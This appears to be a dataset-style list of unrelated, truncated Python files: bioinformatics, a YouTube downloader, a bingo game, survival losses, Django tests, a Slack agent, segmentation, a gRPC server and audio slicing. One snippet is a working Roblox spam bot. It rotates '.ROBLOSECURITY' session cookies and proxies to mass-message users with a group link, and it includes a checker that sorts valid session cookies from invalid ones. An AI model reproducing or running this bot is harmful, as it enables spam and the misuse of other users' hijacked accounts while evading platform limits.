'C'\n\n\ndef calc_contacts(atom_info, distance, seq_length, ss_info):\n    \"\"\"\n    Calculate contacts between aas based on given distance.\n    :return: Dict, containing contact info for each aa\n    \"\"\"\n    contacts = {}\n    matches = {}\n    distance_dict = {}\n    atom_id = list(atom_info.keys())\n    for i, pos_i in enumerate(atom_id):\n        contacts[(pos_i,)] = {'chain': atom_info[pos_i][0],\n                              'pos': atom_info[pos_i][1],\n                              'serial': pos_i,\n                              'aa': AA_DICT.get(atom_info[pos_i][3], 'X'),\n                              'ss': get_sec_struct(ss_info, atom_info[pos_i]),\n                              'global': 0,\n                              'local': 0\n                              }\n        for j in range(0, len(atom_id)):\n            if i == j:\n                continue\n            pos_j = atom_id[j]\n            this_distance = calc_distance(atom_info[pos_i], atom_info[pos_j])\n            distance_dict[(atom_info[pos_i][0], atom_info[pos_i][1]), (atom_info[pos_j][0], atom_info[pos_j][1])] = this_distance\n            if this_distance < distance:\n                matches[atom_info[pos_i][1], atom_info[pos_j][1]] = 1\n                if abs(atom_info[pos_i][1] - atom_info[pos_j][1]) < seq_length and atom_info[pos_i][0] == \\\n                        atom_info[pos_j][0]:\n                    contacts[(pos",
    "\nimport requests\nfrom pytube import YouTube\nfrom tqdm import tqdm\nimport os\n\ndef get_thumbnail(url: str):\n   yt = YouTube(url=url)\n   \n   res = requests.get(yt.thumbnail_url)\n   \n   if not os.path.exists('thumbnails'): \n        os.mkdir('thumbnails')\n       \n   if res.status_code == 200:\n        with open(f'thumbnails/{yt.video_id}.png', 'wb') as file:\n            file.write(res.content)\n            print('done')\n   else:\n        print(f'failed to fetch thumbnail  code:<{res.status_code}>')\n\n\ndef get_best_format(url: str):\n    def on_progress(stream, chunk, bytes_remaining):\n        total_size = stream.filesize\n        bytes_downloaded = total_size - bytes_remaining\n        progress_bar.update(bytes_downloaded - progress_bar.n)\n\n    yt = YouTube(\n        url=url,\n        on_progress_callback=on_progress\n    )\n\n    stream = yt.streams.get_highest_resolution()\n\n    with tqdm(total=stream.filesize, unit='bytes', unit_scale=True, unit_divisor=1024) as progress_bar:\n        \n        stream.download(output_path='highRes')\n\n\ndef get_lowest_format(url: str):\n\n    def on_progress(stream, chunk, bytes_remaining):\n        total_size = stream.filesize\n        bytes_downloaded = total_size - bytes_remaining\n        progress_bar.update(bytes_downloaded - progress_bar.n)\n\n    yt = YouTube(\n        url=url,\n        on_progress_callback=on_progress\n    )\n\n    stream = yt.streams.get_lowest_resolution()\n\n    with tqdm(total=stream.filesize, unit='bytes', unit_scale=True, unit_divisor=1024) as progress_bar:\n        \n        stream.download(output_path='lowRes')      \n",
    "import random\r\nimport time\r\nimport sys\r\nimport json\r\n\r\n# Global variables # Global variables\r\n\r\nsave_file = 'bingo_game_state.txt'\r\nNumbers1 = []  # List to store numbers for the first table\r\nNumbers2 = []  # List to store numbers for the second table\r\nGame_Table1 = []\r\nGame_Table2 = []\r\nComputer = \"Computer\"\r\nTable_Numbers = []\r\ncount1 = 0\r\ncount2 = 0\r\ncount3 = 0\r\nresult1_str = \"\"\r\nresult2_str = \"\"\r\nresult3_str = \"\"\r\nUser_Name = \"\"\r\nCom_or_Friend = 0\r\ncontinuity = 'yes'\r\nfriend_name = \"\"\r\n\r\ndef save_game_state():\r\n    game_state = {\r\n        'User_Name': User_Name,\r\n        'Com_or_Friend': Com_or_Friend,\r\n        'friend_name': friend_name,\r\n        'count1': count1,\r\n        'count2': count2,\r\n        'count3': count3,\r\n        'result1_str': result1_str,\r\n        'result2_str': result2_str,\r\n        'result3_str': result3_str,\r\n        'Table_Numbers': Table_Numbers,\r\n        'Game_Table1': Game_Table1,\r\n        'Game_Table2': Game_Table2,\r\n        'Dimension': Dimension\r\n    }\r\n    for key, value in game_state.items():\r\n        if callable(value):\r\n            game_state[key] = str(value)\r\n\r\n    # Write the game state to the file\r\n    with open('bingo_game_state.txt', 'w') as f1:\r\n        f1.write(json.dumps(game_state))\r\n\r\ndef load_game_state():\r\n    try:\r\n        with open('bingo_game_state.txt', 'r') as f1:\r\n            game_state = json.loads(f1.read())\r\n            global User_Name, Com_or_Friend, count1, count2, count3, User_Result, Com_Result, friend_result_str, Table_Numbers, Game_Table1, Game_Table2, Game_Table3, Dimension, friend_name\r\n            User_Name = game_state.get('User_Name', '')\r\n            Com_or_Friend = game_state.get('Com_or_Friend', 0)\r\n            friend_name = game_state.get('friend_name', '')\r\n            count1 = game_state.get('count1', 0)\r\n            count2 = game_state.get('count2', 0)\r\n            count3 = game_state.get('count3', 0)\r\n            result1_str = game_state.get('result1_str', 0)\r\n            result2_str = game_state.get('result2_str', 0)\r\n            result3_str = game_state.get('result3_str', 0)\r\n            Table_Numbers = game_state.get('Table_Numbers', 0)\r\n            Game_Table1 = game_state.get('Game_Table1', 0)\r\n            Game_Table2 = game_state.get('Game_Table2', 0)\r\n            Dimension = game_state.get('Dimension', 0)\r\n            if (count1 or count2 or count3)>=5:\r\n                count1 = 0 \r\n\r\n            else:\r\n\r\n                # Load other important variables\r\n                print(\"Game state loaded successfully.\")\r\n                print(f\"Resuming game for {User_Name}\")\r\n                print(f\"{User_Name}'s Table:\")\r\n                print_table(Game_Table1)\r\n                Table1_is_bingo()\r\n                if Com_or_Friend == \"friend\":\r\n                    print(f\"{friend_name}'s Table:\")\r\n                    print_table(Game_Table2)\r\n                    Table3_is_bingo()\r\n                if Com_or_Friend == \"computer\":\r\n                    print(\"Computer's Table:\")\r\n                    print_table(Game_Table2)\r\n                    Table2_is_bingo()\r\n\r\n    except FileNotFoundError:\r\n        pass\r\n    return count3,count2,count1\r\n\r\ndef Number_Set(Numbers):\r\n    start = 0\r\n    for i in range(1, Dimension + 1):\r\n        for j in range(1, Dimension + 1):\r\n            start += 1\r\n            Numbers.append(start)\r\n\r\ndef Numbers():\r\n    Number_Set(Numbers1)\r\n    Number_Set(Numbers2)\r\n\r\ndef Table(Game_Table, Numbers, Name):\r\n    for i in range(Dimension):\r\n        Game_Table.append([])\r\n        for j in range(Dimension):\r\n            number = random.choice(Numbers)\r\n            Game_Table[i].append(number)\r\n            Numbers.remove(number)\r\n    print(f\"{Name}'s Table:\")\r\n    for i in range(len(Game_Table)):\r\n        print(\" \".join(str(num).rjust(4) for num in Game_Table[i]))\r\n    return Game_Table\r\n\r\ndef Game_Numbers():\r\n    start = 0\r\n    for i in range(1, Dimension + 1):\r\n        for j in range(1, Dimension + 1):\r\n            start += 1\r\n            Table_Numbers.append(start)\r\n\r\n\r\ndef Change_num_to_x_in_both_tables(first_Game_Table, second_Game_Table, number):\r\n    for i in range(len(first_Game_Table)):\r\n        for j in range(len(first_Game_Table)):\r\n            if first_Game_Table[i][j] == number:\r\n                first_Game_Table[i][j] = \"x\"\r\n    for i in range(len(second_Game_Table)):\r\n        for j in range(len(second_Game_Table)):\r\n            if second_Game_Table[i][j] == number:\r\n                second_Game_Table[i][j] = \"x\"\r\n\r\n\r\ndef exiting():\r\n    print('exiting....')\r\n    time.sleep(1)\r\n    sys.exit(1)\r\n\r\ndef restart():\r\n    time.sleep(1)\r\n    main()\r\n\r\n\r\n\r\n# Change a user-selected number to 'x' in the tables\r\ndef Change_user_num_to_x():\r\n    # Asks the user to enter a number\r\n    while True:\r\n        user_input = input(\"Enter your number...\")\r\n        if user_input.lower() == \"exit\":\r\n            exiting()\r\n        elif user_input.lower()==\"restart\":\r\n            restart()\r\n        else:\r\n            try:\r\n         ",
    "import yaml\ntry:\n    from yaml import CLoader as Loader, CDumper as Dumper\nexcept ImportError:\n    from yaml import Loader, Dumper\n\nimport logging\nfrom collections import OrderedDict\n\nimport numpy as np\nfrom sklearn.metrics import precision_score, recall_score, f1_score, auc, roc_curve, roc_auc_score\n\nimport warnings\nwarnings.filterwarnings('ignore')\nimport torch\ndevice=torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\ndef ordered_yaml():\n    \"\"\"\n    yaml orderedDict support\n    \"\"\"\n    _mapping_tag = yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG\n\n    def dict_representer(dumper, data):\n        return dumper.represent_dict(data.items())\n\n    def dict_constructor(loader, node):\n        return OrderedDict(loader.construct_pairs(node))\n\n    Dumper.add_representer(OrderedDict, dict_representer)\n    Loader.add_constructor(_mapping_tag, dict_constructor)\n    return Loader, Dumper\n\n\ndef acc(outputs, targets):\n    return np.mean(outputs.detach().cpu().numpy().argmax(axis=1) == targets.detach().cpu().numpy())\n\ndef metrics(outputs, targets, average):\n    preds = outputs.argmax(1)\n    precision = precision_score(targets, preds, average=average)\n    recall = recall_score(targets, preds, average=average)\n    f1 = f1_score(targets, preds, average=average)\n    if average == 'binary':\n        fpr, tpr, thresholds = roc_curve(targets, preds)\n        aucroc = auc(fpr, tpr)\n    else:\n        aucroc = roc_auc_score(targets, outputs, multi_class='ovr')\n    return precision, recall, f1, aucroc\n\ndef get_logger():\n    logger_name = 'main-logger'\n    logger = logging.getLogger(logger_name)\n    logger.setLevel(logging.INFO)\n    handler = logging.StreamHandler()\n    fmt = \"[%(asctime)s %(levelname)s %(filename)s line %(lineno)d %(process)d] %(message)s\"\n    handler.setFormatter(logging.Formatter(fmt))\n    logger.addHandler(handler)\n    return logger\n\nclass CoxSurvLoss(object):\n    def __call__(hazards, S, c):\n        # This calculation credit to Travers Ching https://github.com/traversc/cox-nnet\n        # Cox-nnet: An artificial neural network method for prognosis prediction of high-throughput omics data\n        current_batch_len = len(S)\n        R_mat = np.zeros([current_batch_len, current_batch_len], dtype=int)\n        for i in range(current_batch_len):\n            for j in range(current_batch_len):\n                R_mat[i,j] = S[j] >= S[i]\n\n        R_mat = torch.FloatTensor(R_mat).to(device)\n        theta = hazards.reshape(-1)\n        exp_theta = torch.exp(theta)\n        loss_cox = -torch.mean((theta - torch.log(torch.sum(exp_theta*R_mat, dim=1))) * (1-c))\n        return loss_cox\n    \ndef ce_loss(hazards, S, Y, c, alpha=0.4, eps=1e-7):\n    batch_size = len(Y)\n    Y = Y.view(batch_size, 1) # ground truth bin, 1,2,...,k         [1,1]\n    c = c.view(batch_size, 1).float() #censorship status, 0 or 1    [1,1]\n    if S is None:\n        S = torch.cumprod(1 - hazards, dim=1) # surival is cumulative product of 1 - hazards\n    # without padding, S(0) = S[0], h(0) = h[0]\n    # after padding, S(0) = S[1], S(1) = S[2], etc, h(0) = h[0]\n    #h[y] = h(1)\n    #S[1] = S(1)\n    # S_padded = torch.cat([torch.ones_like(c), S], 1)                #[1,5]\n    S_padded = S\n    reg = -(1 - c) * (torch.log(torch.gather(S_padded, 1, Y)+eps) + torch.log(torch.gather(hazards, 1, Y).clamp(min=eps)))\n    ce_l = - c * torch.log(torch.gather(S, 1, Y).clamp(min=eps)) - (1 - c) * torch.log(1 - torch.gather(S, 1, Y).clamp(min=eps))\n    loss = (1-alpha) * ce_l + alpha * reg\n    loss = loss.mean()\n    return loss\n\ndef nll_loss(hazards, S, Y, c, alpha=0.4, eps=1e-7):\n    batch_size = len(Y)\n    Y = Y.view(batch_size, 1) # ground truth bin, 1,2,...,k\n    c = c.view(batch_size, 1).float() #censorship status, 0 or 1\n    if S is None:\n        S = torch.cumprod(1 - hazards, dim=1) # surival is cumulative product of 1 - hazards\n    # without padding, S(0) = S[0], h(0) = h[0]\n    S_padded = torch.cat([torch.ones_like(c), S], 1) #S(-1) = 0, all patients are alive from (-inf, 0) by definition\n    # after padding, S(0) = S[1], S(1) = S[2], etc, h(0) = h[0]\n    #h[y] = h(1)\n    #S[1] = S(1)\n    uncensored_loss = -(1 - c) * (torch.log(torch.gather(S_padded, 1, Y).clamp(min=eps)) + torch.log(torch.gather(hazards, 1, Y).clamp(min=eps)))\n    censored_loss = - c * torch.log(torch.gather(S_padded, 1, Y+1).clamp(min=eps))\n    neg_l = censored_loss + uncensored_loss\n    loss = (1-alpha) * neg_l + alpha * uncensored_loss\n    loss = loss.mean()\n    return loss\n\nclass CrossEntropySurvLoss(object):\n    def __init__(self, alpha=0.15):\n        self.alpha = alpha\n\n    def __call__(self, hazards, S, Y, c, alpha=None): \n        if alpha is None:\n            return ce_loss(hazards, S, Y, c, alpha=self.alpha)\n        else:\n            return ce_loss(hazards, S, Y, c, alpha=alpha)\n        \nclass NLLSurvLoss(object):\n    def __init__(self, alpha=0.15):\n        self.alpha = alpha\n\n    def __call__(self, hazards, S, Y, c, alpha=None):\n        if alpha is None:\n            return nll_loss(ha",
    "from django.test import TestCase\nfrom .models import Members, Book, Transactions\n\n\nclass MembersTestCase(TestCase):\n    def setUp(self):\n        Members.objects.create(\n            name=\"John Doe\", email=\"john@example.com\", phone=\"1234567890\"\n        )\n\n    def test_member_creation(self):\n        member = Members.objects.get(name=\"John Doe\")\n        self.assertEqual(member.name, \"John Doe\")\n        self.assertEqual(member.email, \"john@example.com\")\n        self.assertEqual(member.phone, \"1234567890\")\n\n\nclass BookTestCase(TestCase):\n    def setUp(self):\n        Members.objects.create(\n            name=\"John Doe\", email=\"john@example.com\", phone=\"1234567890\"\n        )\n        member = Members.objects.get(name=\"John Doe\")\n        Book.objects.create(\n            title=\"Book Title\",\n            author=\"Author Name\",\n            stock=1,\n            price=10,\n            year=2022,\n            issued_to=member,\n        )\n\n    def test_book_creation(self):\n        book = Book.objects.get(title=\"Book Title\")\n        self.assertEqual(book.title, \"Book Title\")\n        self.assertEqual(book.author, \"Author Name\")\n        self.assertEqual(book.stock, 1)\n        self.assertEqual(book.price, 10)\n        self.assertEqual(book.year, 2022)\n\n    def test_issue_book(self):\n        book = Book.objects.get(title=\"Book Title\")\n        self.assertTrue(book.issue_book())\n        self.assertEqual(book.stock, 0)\n        self.assertFalse(book.issue_book())  # Trying to issue when stock is 0\n\n\nclass TransactionsTestCase(TestCase):\n    def setUp(self):\n        Members.objects.create(\n            name=\"John Doe\", email=\"john@example.com\", phone=\"1234567890\"\n        )\n        member = Members.objects.get(name=\"John Doe\")\n        Book.objects.create(\n            title=\"Book Title\",\n            author=\"Author Name\",\n            stock=1,\n            price=10,\n            year=2022,\n            issued_to=member,\n        )\n        book = Book.objects.get(title=\"Book Title\")\n        Transactions.objects.create(book=book, member=member, rent_fee=5)\n\n    def test_transaction_creation(self):\n        transaction = Transactions.objects.get(rent_fee=5)\n        self.assertIsNotNone(transaction.issue_date)\n\n    def test_update_balance(self):\n        member = Members.objects.get(name=\"John Doe\")\n        self.assertEqual(member.balance, 100)\n        Transactions.objects.create(\n            book=Book.objects.get(title=\"Book Title\"), member=member, rent_fee=5\n        )\n        member.refresh_from_db()\n        self.assertEqual(member.balance, 95)\n",
    "# prerequisites\n# Create a slack integration\n\n# Create channels with issues in title (Ex: crewai-issues, composio-issues). This is where user's issues are reported.\n# Create a channel called `today-summary-bot`. This is where the final message would be posted.\n\n# This ai agent will fetch the issues reported in the channels. Combine them based on the priority.\n# Posts the final summary in a `today-summary-bot` channel.\n# We can analyse the sentiment for that day based on the user queries.\n# Same sentiment parametr will be posted in the channel\n\n# composio-cli add slack\n\nfrom autogen import AssistantAgent, UserProxyAgent\nfrom composio_autogen import App, Action, ComposioToolset\n\n\nllm_config = {\n    \"config_list\": [\n        {\n            \"model\": \"gpt-3.5-turbo\",\n            \"api_key\": '***OPEN_API_KEY***',\n        }\n    ]\n}\n\nsuper_agent = AssistantAgent(\n    \"chatbot\",\n    system_message=\"\"\"You are a super intelligent personal assistant.\n    You have been given a set of tools that you are supposed to choose from.\n    You decide the right tool and execute it to achieve your task.\n    Reply TERMINATE when the task is done or when user's content is empty\"\"\",\n    llm_config=llm_config,\n)\n\nuser_proxy = UserProxyAgent(\n    \"user_proxy\",\n    is_termination_msg=lambda x: x.get(\"content\", \"\")\n    and \"TERMINATE\" in x.get(\"content\", \"\"),\n    human_input_mode=\"NEVER\",  # Don't take input from User\n    code_execution_config={\"use_docker\": False},\n)\n\ncomposio_tools = ComposioToolset()\n\ncomposio_tools.register_tools(\n    tools=[App.SLACK], caller=super_agent, executor=user_proxy\n)\n\ntask = \"\"\"Fetch all the messages from channels which includes `issues` in title for that day.\nGroup the messages based on the priority.\nOnes with bug, error or security vulnerability will be of highest priority (add a nice icon).\nFeature requests, documentation are medium priority (add a nice icon).\nUnclear requirements are lowest priority (add a nice icon).\nSummarize the messages with highest priority to lowest priority order.\nPost the summary in the `today-summary-bot` channel with title having `Today's Issues Summary`\"\"\"\n\nresponse = user_proxy.initiate_chat(super_agent, message=task)\n\nprint(response.chat_history)\n\n\nnps_task = \"\"\"Fetch the message from `today-summary-bot` channel for today.\n  This lists the issues faced by the user, their requirements from composio.\n  They are ordered from highest priority to lowest priority.\n  Go through the content and understand the user's sentiments.\n  Rate them on a scale of 100 to determine the today's NPS.\n  Post the rating in `today-summary-bot` channel with title `Today's NPS: ` (add a nice icon) \n\"\"\"\n\nresponse = user_proxy.initiate_chat(super_agent, message=nps_task)\n\nprint(response.chat_history)\n",
    "import os\nimport numpy as np\nfrom PIL import Image\nimport paddlelite.lite as lite\nimport cv2\n\n# 1. \u521b\u5efa PaddlePredictor\nconfig = lite.MobileConfig()\nconfig.set_model_from_file(\"mobilenet_v4_opt.nb\")\npredictor = lite.create_paddle_predictor(config)\n\n\n# 2. \u5b9a\u4e49\u989c\u8272\u6620\u5c04\ncmap = {0: (255, 0, 0), 1: (0, 255, 0), 2: (0, 0, 255)}  # \u80cc\u666f-\u7ea2\u8272, \u8db3\u90e8-\u7eff\u8272, \u8db3\u5f13-\u84dd\u8272\n\n\n# 3. \u5faa\u73af\u8bfb\u53d6\u56fe\u7247\u5e76\u8fdb\u884c\u63a8\u7406\nimage_dir = \"foot_data/foot_test/\"\nfor filename in os.listdir(image_dir):\n    if filename.endswith(\".jpg\"):\n        # 3.1 \u51c6\u5907\u8f93\u5165\u6570\u636e\n        image = Image.open(os.path.join(image_dir, filename))\n        image = image.resize((640, 360))\n        input_data = np.array(image).transpose(2, 0, 1)[np.newaxis, :].astype(\"float32\")\n        mean = np.array([0.485, 0.456, 0.406]).reshape(1, 3, 1, 1)\n        std = np.array([0.229, 0.224, 0.225]).reshape(1, 3, 1, 1)\n        input_data = ((input_data / 255.0 - mean) / std).astype(\"float32\")\n\n        # 3.2 \u8bbe\u7f6e\u8f93\u5165\u6570\u636e\n        input_tensor = predictor.get_input(0)\n        input_tensor.resize([1, 3, 360, 640])\n        input_tensor.from_numpy(input_data)\n\n        # 3.3 \u6267\u884c\u9884\u6d4b\n        predictor.run()\n\n        # 3.4 \u83b7\u53d6\u8f93\u51fa\u6570\u636e\n        output_tensor = predictor.get_output(0)\n        output_data = output_tensor.numpy()\n\n        # 3.5 \u5904\u7406\u5206\u5272\u7ed3\u679c\n        original_image = cv2.imread(os.path.join(image_dir, filename))\n        original_image = cv2.resize(original_image, (640, 360))\n        segmentation_map = output_data[0].astype(int)\n        segmentation_image = np.zeros((360, 640, 3), dtype=np.uint8)\n        for i in range(360):\n            for j in range(640):\n                segmentation_image[i, j] = cmap[segmentation_map[i, j]]\n\n        # 3.6 \u5c06\u5206\u5272\u7ed3\u679c\u53e0\u52a0\u5230\u539f\u59cb\u56fe\u50cf\u4e0a\n        alpha = 0.5\n        blended_image = cv2.addWeighted(original_image, 1 - alpha, segmentation_image, alpha, 0)\n\n        # 3.7 \u6dfb\u52a0\u7c7b\u522b\u6807\u7b7e\n        for i in range(3):\n            x, y = 10, 30 + i * 30\n            cv2.putText(blended_image, f\"Class {i}: {cmap[i]}\", (x, y), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 2)\n\n        # 3.8 \u663e\u793a\u7ed3\u679c\n        cv2.imshow(f\"Segmentation Result - {filename}\", blended_image)\n        cv2.waitKey(0)\n        cv2.destroyWindow(f\"Segmentation Result - {filename}\")\n\ncv2.destroyAllWindows()\n",
    "import discord, json, re, requests, random, time, concurrent.futures, threading, math\r\nfrom discord.ext import commands\r\n\r\nwith open('cookies.txt', 'r') as f:\r\n    cookies = [line.strip() for line in f]\r\n\r\nwith open(\"config.json\") as jsonfile:\r\n    config = json.load(jsonfile)\r\n    token = config[\"botToken\"]\r\n    messageTop = config[\"message\"]\r\n    messageDescription = config[\"messageDescription\"]\r\n    num_threads = config[\"threads\"]\r\n    autoThreads = config[\"autoThreads\"]\r\nwith open('proxys.txt', 'r') as f:\r\n    proxys = [line.strip() for line in f]\r\n\r\nwait_event = threading.Event()\r\nerrors = 0\r\ndef send(idListNum, num, threadCount):\r\n    global messagesSent\r\n    global every1000\r\n    global errors\r\n    global cookiesCleaned\r\n    global cookies\r\n    global validCookies\r\n    global numWait\r\n    global sentUsers\r\n    messagesSent = 0\r\n    validCookies = []\r\n    cookiesCleaned = True\r\n    errors = 0\r\n    every1000 = 0\r\n    numWait = 0\r\n    print(\"starting\")\r\n    for userID in idListNum:\r\n        error = True\r\n        while error == True:\r\n            proxy = random.choice(proxys)\r\n            proxies={\r\n                \"http\": proxy,\r\n                \"https\": proxy\r\n                    }\r\n            cookie = random.choice(cookies)\r\n            s = requests.session()\r\n            s.cookies[\".ROBLOSECURITY\"] = cookie\r\n            try:\r\n                s.headers['X-CSRF-TOKEN'] = s.post(\"https://auth.roblox.com/v2/login\",proxies=proxies, timeout=2).headers['X-CSRF-TOKEN']\r\n                sendTo = userID\r\n                payload = {\"subject\":messageTop,\"body\":f\"{messageDescription} {groupLink}\",\"recipientid\":sendTo}\r\n                send = s.post(\"https://privatemessages.roblox.com/v1/messages/send\",json=payload, proxies=proxies, timeout=2)\r\n                if send.status_code == 200:\r\n                    sentUsers.append(userID)\r\n                    messagesSent+=1\r\n                    every1000+=1\r\n                    error = False\r\n                    print(f\"[\u2714] (THREAD {num+1}) Sending a message, total sent\", messagesSent)\r\n                else:\r\n                    errors +=1\r\n                    print(f\"[X] (THREAD {num+1}) Unable to send message status code {send.status_code}\")\r\n                    time.sleep(num_threads+2)\r\n                if amount==messagesSent:\r\n                    with open(\"alreadymessaged.json\", \"r\") as infile:\r\n                        listNew = json.load(infile)\r\n                    for x in sentUsers:\r\n                        listNew.append(x)\r\n                    sentUsers.clear()\r\n                    with open(\"alreadymessaged.json\", \"w\") as outfile:\r\n                        json.dump(listNew, outfile)\r\n                    print(\"[!] Finished sending messages\")\r\n                    return\r\n                if every1000 == 1000:\r\n                    print(f\"[!] (THREAD {num+1}) Saving to file...\")\r\n                    #cookiesCleaned = False\r\n                    every1000 = 0\r\n                    with open(\"alreadymessaged.json\", \"r\") as infile:\r\n                        listNew = json.load(infile)\r\n                    for x in sentUsers:\r\n                        listNew.append(x)\r\n                    sentUsers.clear()\r\n                    with open(\"alreadymessaged.json\", \"w\") as outfile:\r\n                        json.dump(listNew, outfile)\r\n\r\n                    # Currently disabled\r\n                    if False:\r\n                        wait_event.clear()\r\n                        print(\"Waiting for other threads to complete...\")\r\n                        while threadCount-1 > numWait:\r\n                            time.sleep(1)\r\n                        time.sleep(2)\r\n                        print(\"SCANNING COOKIES\")\r\n\r\n                        for cookie in cookies:\r\n                            try:\r\n                                s = requests.session()\r\n                                s.cookies[\".ROBLOSECURITY\"] = cookie\r\n                                s.headers['X-CSRF-TOKEN'] = s.post(\"https://auth.roblox.com/v2/login\").headers['X-CSRF-TOKEN']\r\n                                check = s.get(\"https://users.roblox.com/v1/users/authenticated\")\r\n                                if check.status_code == 200:\r\n                                    print(f\"[\u2714] Adding valid cookie ({len(cookies)-cookies.index(cookie)} left)\")\r\n                                    validCookies.append(cookie)\r\n                                elif check.status_code != 200:\r\n                                    print(f\"[\u00d7] Removing invalid cookie ({len(cookies)-cookies.index(cookie)} left)\")\r\n                            except:\r\n                                print(f\"[\u00d7] Removing invalid cookie ({len(cookies)-cookies.index(cookie)} left)\")\r\n\r\n                        cookies.clear()\r\n                        with open(\"cookies.txt\", \"w\") as f:\r\n                            for cookie in validCookies:\r\n                                f.write(\"%s\\n\" % cookie)\r\n                                cookies.append(cooki",
    "import json\nfrom Layer import Layer\nfrom activation_functions.Relu import ReluActivation\nfrom activation_functions.Sigmoid import SigmoidActivation\nfrom reading_letters_fausett import read_csv_data_letters_fausset\n\nhidden_layer = Layer(63, 5)\noutput_layer = Layer(5, 7)\n\nfile_path = \"caracteres-ruido.csv\"\nX, y = read_csv_data_letters_fausset(file_path)\n\n# Define the filename for the JSON file\njson_filename = \"output.json\"\n\n# Read the results from the JSON file\nwith open(json_filename, 'r') as json_file:\n    results = json.load(json_file)\n\n# Extract the weights and biases from the results dictionary\nhidden_layer_weights = results[\"Pesos da camada escondida\"]\nhidden_layer_biases = results[\"Bias da camada escondida\"]\noutput_layer_weights = results[\"Pesos da camada de output\"]\noutput_layer_biases = results[\"Bias da camada de output\"]\n\nhidden_layer.set_weights(hidden_layer_weights)\nhidden_layer.set_biases(hidden_layer_biases)\n\noutput_layer.set_weights(output_layer_weights)\noutput_layer.set_biases(output_layer_biases)\n\nsucesso = 0\nerro = 0\n\nfor index_test in range(len(X)):\n\n\n    hidden_layer.forward(X[index_test])\n\n    #pr\u00f3ximo passo \u00e9 aplicar a fun\u00e7\u00e3o de ativa\u00e7\u00e3o ao output dessa camada\n    hidden_activation = SigmoidActivation()\n    hidden_activation.forward(hidden_layer.output) #f(z_in)\n\n    #hidden_activation.output \u00e9 o input da pr\u00f3xima camada\n    output_layer.forward(hidden_activation.output)\n\n    #output.layer.output = y_in\n    output_activation = SigmoidActivation()\n    output_activation.forward(output_layer.output) #f(y_in)\n\n    #output_activation.output \u00e9 a sa\u00edda da rede neural\n    result = output_activation.output\n\n    expected_output = y[index_test]\n    \n    if result.index(max(result)) == expected_output.index(1): sucesso += 1\n    else: erro += 1\n\nprint(\"Sucessos: \", sucesso)\nprint(\"Erro: \", erro)\nprint(\"Porcentagem de sucesso: \", (sucesso)/(sucesso + erro))",
    "from concurrent import futures\nimport time\n\nimport grpc\nimport greet_pb2\nimport greet_pb2_grpc\n\nclass GreeterServicer(greet_pb2_grpc.GreeterServicer):\n    def SayHello(self, request, context):\n        print(\"SayHello Request Made:\")\n        print(request)\n        hello_reply = greet_pb2.HelloReply()\n        hello_reply.message = f\"{request.greeting} {request.name}\"\n\n        return hello_reply\n    \n    def ParrotSaysHello(self, request, context):\n        print(\"ParrotSaysHello Request Made:\")\n        print(request)\n\n        for i in range(3):\n            hello_reply = greet_pb2.HelloReply()\n            hello_reply.message = f\"{request.greeting} {request.name} {i + 1}\"\n            yield hello_reply\n            time.sleep(3)\n\n    def ChattyClientSaysHello(self, request_iterator, context):\n        delayed_reply = greet_pb2.DelayedReply()\n        for request in request_iterator:\n            print(\"ChattyClientSaysHello Request Made:\")\n            print(request)\n            delayed_reply.request.append(request)\n\n        delayed_reply.message = f\"You have sent {len(delayed_reply.request)} messages. Please expect a delayed response.\"\n        return delayed_reply\n\n    def InteractingHello(self, request_iterator, context):\n        for request in request_iterator:\n            print(\"InteractingHello Request Made:\")\n            print(request)\n\n            hello_reply = greet_pb2.HelloReply()\n            hello_reply.message = f\"{request.greeting} {request.name}\"\n\n            yield hello_reply\n\ndef serve():\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    greet_pb2_grpc.add_GreeterServicer_to_server(GreeterServicer(), server)\n    server.add_insecure_port(\"localhost:50051\")\n    server.start()\n    server.wait_for_termination()\n\nif __name__ == \"__main__\":\n    serve()",
    "import numpy as np\n\n\n# This function is obtained from librosa.\ndef get_rms(\n    y,\n    *,\n    frame_length=2048,\n    hop_length=512,\n    pad_mode=\"constant\",\n):\n    padding = (int(frame_length // 2), int(frame_length // 2))\n    y = np.pad(y, padding, mode=pad_mode)\n\n    axis = -1\n    # put our new within-frame axis at the end for now\n    out_strides = y.strides + tuple([y.strides[axis]])\n    # Reduce the shape on the framing axis\n    x_shape_trimmed = list(y.shape)\n    x_shape_trimmed[axis] -= frame_length - 1\n    out_shape = tuple(x_shape_trimmed) + tuple([frame_length])\n    xw = np.lib.stride_tricks.as_strided(\n        y, shape=out_shape, strides=out_strides\n    )\n    if axis < 0:\n        target_axis = axis - 1\n    else:\n        target_axis = axis + 1\n    xw = np.moveaxis(xw, -1, target_axis)\n    # Downsample along the target axis\n    slices = [slice(None)] * xw.ndim\n    slices[axis] = slice(0, None, hop_length)\n    x = xw[tuple(slices)]\n\n    # Calculate power\n    power = np.mean(np.abs(x) ** 2, axis=-2, keepdims=True)\n\n    return np.sqrt(power)\n\n\nclass Slicer:\n    def __init__(self,\n                 sr: int,\n                 threshold: float = -40.,\n                 min_length: int = 5000,\n                 min_interval: int = 300,\n                 hop_size: int = 20,\n                 max_sil_kept: int = 5000):\n        if not min_length >= min_interval >= hop_size:\n            raise ValueError('The following condition must be satisfied: min_length >= min_interval >= hop_size')\n        if not max_sil_kept >= hop_size:\n            raise ValueError('The following condition must be satisfied: max_sil_kept >= hop_size')\n        min_interval = sr * min_interval / 1000\n        self.threshold = 10 ** (threshold / 20.)\n        self.hop_size = round(sr * hop_size / 1000)\n        self.win_size = min(round(min_interval), 4 * self.hop_size)\n        self.min_length = round(sr * min_length / 1000 / self.hop_size)\n        self.min_interval = round(min_interval / self.hop_size)\n        self.max_sil_kept = round(sr * max_sil_kept / 1000 / self.hop_size)\n\n    def _apply_slice(self, waveform, begin, end):\n        if len(waveform.shape) > 1:\n            return waveform[:, begin * self.hop_size: min(waveform.shape[1], end * self.hop_size)]\n        else:\n            return waveform[begin * self.hop_size: min(waveform.shape[0], end * self.hop_size)]\n\n    # @timeit\n    def slice(self, waveform):\n        if len(waveform.shape) > 1:\n            samples = waveform.mean(axis=0)\n        else:\n            samples = waveform\n        if (samples.shape[0] + self.hop_size - 1) // self.hop_size <= self.min_length:\n            return [waveform]\n        rms_list = get_rms(y=samples, frame_length=self.win_size, hop_length=self.hop_size).squeeze(0)\n        sil_tags = []\n        silence_start = None\n        clip_start = 0\n        for i, rms in enumerate(rms_list):\n            # Keep 